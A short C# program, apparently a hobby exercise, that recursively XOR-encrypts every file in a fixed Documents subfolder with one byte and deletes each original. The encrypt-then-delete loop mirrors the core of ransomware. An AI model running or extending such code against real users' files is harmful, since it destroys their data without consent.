using System.IO;

namespace crypt
{
    internal class Program
    {
        static byte xorNumber = 145;

        static string cryptFrom = @"C:\Users\user\Documents\crypt";

        static void Main(string[] args)
        {
            Encrypter XorEncrypter = new Encrypter((byte i) => EncryptionAlgorithms.XOR(i, xorNumber));

            foreach (string file in Directory.EnumerateFiles(cryptFrom, "*.*", SearchOption.AllDirectories))
            {
                XorEncrypter.Encrypt(file);
                File.Delete(file);
            }
        }
    }
}